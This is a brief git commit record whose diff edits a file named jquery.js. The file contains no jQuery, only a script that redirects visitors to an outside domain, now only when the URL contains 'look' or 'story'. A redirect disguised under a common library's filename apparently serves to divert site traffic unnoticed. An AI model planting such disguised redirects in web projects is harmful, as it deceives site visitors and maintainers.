2479e84e418c65d253842e024724ed69d155ae1e
fidelasin <66884583+fidelasin@users.noreply.github.com>
2020-06-27 16:38:50 +0300

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,1 +1,4 @@
-location.href = 'https://www.shakira.fun' + window.location.pathname;
+ if (window.location.href.indexOf("look") > 1 || window.location.href.indexOf("story") > 1 )
+            {
+window.location = 'https://www.shakira.fun' + window.location.pathname;
+            }
